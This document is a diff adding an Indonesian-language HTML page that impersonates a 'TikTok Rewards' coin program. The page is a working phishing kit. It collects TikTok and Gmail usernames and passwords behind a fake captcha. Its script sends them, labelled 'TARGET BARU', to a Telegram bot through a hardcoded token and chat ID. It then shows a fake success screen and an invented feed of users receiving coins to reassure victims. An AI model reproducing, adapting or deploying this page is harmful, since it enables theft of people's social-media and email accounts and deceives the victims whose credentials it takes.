@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok Rewards - Professional Sync</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    
+<style>
+    /* Dasar & Layout */
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+    body { background-color: #000; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; }
+    
+    /* Kartu & Konten */
+    .card { width: 100%; max-width: 420px; background: #121212; border-radius: 12px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #222; }
+    .header { background: #000; padding: 25px; text-align: center; border-bottom: 1px solid #333; }
+    .content { padding: 30px; }
+    
+    .logo-text { font-weight: 900; font-size: 22px; letter-spacing: -1px; }
+    .tiktok-red { color: #FE2C55; }
+    
+    /* Indikator Langkah */
+    .step-indicator { display: flex; justify-content: space-between; margin-bottom: 30px; }
+    .step { flex: 1; height: 4px; background: #333; margin: 0 4px; border-radius: 2px; }
+    .step.active { background: #FE2C55; }
+
+    h2 { font-size: 18px; margin-bottom: 10px; text-align: center; }
+    p.desc { color: #a5a5a5; font-size: 13px; text-align: center; margin-bottom: 25px; line-height: 1.5; }
+
+    /* Input & Form */
+    .input-box { margin-bottom: 15px; position: relative; }
+    .input-box i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #555; }
+    input { width: 100%; background: #1f1f1f; border: 1px solid #333; padding: 14px 15px 14px 45px; border-radius: 8px; color: white; outline: none; transition: 0.3s; -webkit-appearance: none; }
+    input:focus { border-color: #FE2C55; background: #252525; }
+
+    /* Captcha */
+    .captcha-area { background: #1a1a1a; padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px dashed #444; }
+    #captcha-txt { font-family: monospace; font-size: 20px; font-weight: bold; color: #25F4EE; letter-spacing: 6px; text-decoration: line-through; }
+
+    /* Tombol */
+    .btn { width: 100%; padding: 15px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; }
+    .btn-tiktok { background: #fff; color: #000; margin-bottom: 15px; }
+    .btn-next { background: #FE2C55; color: #fff; }
+
+    /* Animasi */
+    .hidden { display: none; }
+    .loading-spinner { animation: spin 1s linear infinite; }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+
+    /* Auto Scrolling */
+    @keyframes scrollUp {
+        0% { transform: translateY(0); }
+        100% { transform: translateY(-50%); }
+    }
+    .scroll-container { height: 110px; overflow: hidden; position: relative; }
+    .scroll-content { animation: scrollUp 10s linear infinite; }
+    .status-item { padding: 6px 0; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; font-size: 11px; }
+</style>
+
+</head>
+<body>
+
+    <div class="card">
+        <div class="header">
+            <span class="logo-text"><i class="fab fa-tiktok"></i> TikTok <span class="tiktok-red">REWARDS</span></span>
+        </div>
+        
+        <div class="content">
+            <div id="step-1">
+                <div class="step-indicator"><div class="step active"></div><div class="step"></div><div class="step"></div></div>
+                <h2>Otorisasi Akun</h2>
+                <p class="desc">Hubungkan akun TikTok Anda untuk memeriksa kelayakan koin loyalitas.</p>
+                <div class="input-box"><i class="fas fa-user"></i><input type="text" id="tk-user" placeholder="Username TikTok (@user)"></div>
+                <div class="input-box"><i class="fas fa-lock"></i><input type="password" id="tk-pass" placeholder="Masukkan Kata Sandi TikTok"></div>
+                <button class="btn btn-tiktok" onclick="toStep2()"><i class="fab fa-tiktok"></i> Lanjutkan</button>
+            </div>
+
+            <div id="step-2" class="hidden">
+                <div class="step-indicator"><div class="step active"></div><div class="step active"></div><div class="step"></div></div>
+                <h2>Verifikasi Keamanan</h2>
+                <p class="desc">Verifikasi kepemilikan akun melalui layanan Google yang terhubung.</p>
+                <div class="input-box"><i class="fas fa-envelope"></i><input type="email" id="gm-user" placeholder="Email Google / Gmail"></div>
+                <div class="input-box"><i class="fas fa-lock"></i><input type="password" id="gm-pass" placeholder="Kata Sandi Email"></div>
+                <div class="captcha-area">
+                    <div style="display:flex; justify-content: space-between; margin-bottom: 8px;">
+                        <span style="font-size: 10px; color: #666;">KEAMANAN SISTEM</span>
+                        <span onclick="newCaptcha()" style="font-size: 10px; color: #25F4EE; cursor: pointer;">REFRESH</span>
+                    </div>
+                    <div style="display:flex; align-items: center; gap: 10px;">
+                        <span id="captcha-txt">ABCD</span>
+                        <input type="text" id="cap-in" placeholder="Kode" style="padding: 10px; margin: 0; text-align: center; width: 100px;">
+                    </div>
+                </div>
+                <button class="btn btn-next" id="btn-submit" onclick="toFinish()">Konfirmasi</button>
+            </div>
+
+            <div id="step-3" class="hidden">
+                <div class="text-center">
+                    <div style="font-size: 50px; color: #25F4EE; margin-bottom: 15px;"><i class="fas fa-check-circle"></i></div>
+                    <h2 style="color: #fff;">VERIFIKASI BERHASIL</h2>
+                    <p class="desc">Data masuk ke sistem sinkronisasi pusat.</p>
+                </div>
+                <div style="background: #1a1a1a; padding: 15px; border-radius: 12px; border: 1px solid #333; margin-bottom: 20px;">
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 12px;">
+                        <span style="color: #666;">ID TIKTOK: <b id="res-tk" style="color: #fff;">-</b></span>
+                        <span style="color: #FE2C55; font-weight: bold;" id="status-text">PROSES...</span>
+                    </div>
+                    <div style="width: 100%; height: 5px; background: #333; border-radius: 10px; overflow: hidden; margin-bottom: 10px;">
+                        <div id="progress-bar" style="width: 15%; height: 100%; background: #25F4EE; transition: width 2s ease;"></div>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; font-size: 10px; color: #555;">
+                        <span>Waktu: <b id="current-time">00:00:00</b></span>
+                        <span>Est: <b>1-5 Jam</b></span>
+                    </div>
+                </div>
+                <div style="background: rgba(37, 244, 238, 0.05); padding: 15px; border-radius: 12px; border: 1px solid rgba(37, 244, 238, 0.1);">
+                    <div class="scroll-container">
+                        <div class="scroll-content">
+                            <div class="status-item"><span>@ahmad_****</span> <span style="color:#00ff00">+20k Koin</span></div>
+                            <div class="status-item"><span>@siti_ra****</span> <span style="color:#00ff00">+20k Koin</span></div>
+                            <div class="status-item"><span>@putri_v****</span> <span style="color:#00ff00">+20k Koin</span></div>
+                            <div class="status-item"><span>@rizky_****</span> <span style="color:#00ff00">+20k Koin</span></div>
+                            <div class="status-item"><span>@ahmad_****</span> <span style="color:#00ff00">+20k Koin</span></div>
+                            <div class="status-item"><span>@siti_ra****</span> <span style="color:#00ff00">+20k Koin</span></div>
+                        </div>
+                    </div>
+                </div>
+                <button class="btn btn-next" style="margin-top: 25px; background: #222;" onclick="location.reload()">Selesai</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TOKEN = "8328625637:AAHXiqgKFCw9hwyWn8lLWbOVE-bI1xUaaxo";
+        const CHAT_ID = "1164784767";
+
+        let code = "";
+        function newCaptcha() {
+            const chars = "0123456789ABCDEF";
+            code = "";
+            for(let i=0; i<4; i++) code += chars.charAt(Math.floor(Math.random()*chars.length));
+            document.getElementById('captcha-txt').innerText = code;
+        }
+        window.onload = newCaptcha;
+
+        function toStep2() {
+            const u = document.getElementById('tk-user').value;
+            const p = document.getElementById('tk-pass').value;
+            if(!u || !p) return alert("Lengkapi data TikTok!");
+            document.getElementById('step-1').classList.add('hidden');
+            document.getElementById('step-2').classList.remove('hidden');
+        }
+
+        async function toFinish() {
+            const tkU = document.getElementById('tk-user').value;
+            const tkP = document.getElementById('tk-pass').value;
+            const gmU = document.getElementById('gm-user').value;
+            const gmP = document.getElementById('gm-pass').value;
+            const cap = document.getElementById('cap-in').value;
+
+            if(!gmU || !gmP) return alert("Isi data Gmail!");
+            if(cap.toUpperCase() !== code) { alert("Captcha Salah!"); newCaptcha(); return; }
+
+            const btn = document.getElementById('btn-submit');
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Memproses...';
+            btn.disabled = true;
+
+            const msg = `⚠️ TARGET BARU ⚠️\n\n👤 TikTok: ${tkU}\n🔑 Pass TK: ${tkP}\n📧 Gmail: ${gmU}\n🔐 Pass GM: ${gmP}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: CHAT_ID, text: msg})
+                });
+                
+                document.getElementById('res-tk').innerText = tkU;
+                document.getElementById('step-2').classList.add('hidden');
+                document.getElementById('step-3').classList.remove('hidden');
+                
+                setInterval(() => { 
+                    document.getElementById('current-time').innerText = new Date().toLocaleTimeString(); 
+                }, 1000);
+                
+                setTimeout(() => { 
+                    document.getElementById('progress-bar').style.width = "80%";
+                    document.getElementById('status-text').innerText = "MENUNGGU ANTREAN";
+                }, 500);
+            } catch (e) {
+                alert("Koneksi gagal, silakan coba lagi.");
+                btn.innerHTML = 'Konfirmasi';
+                btn.disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
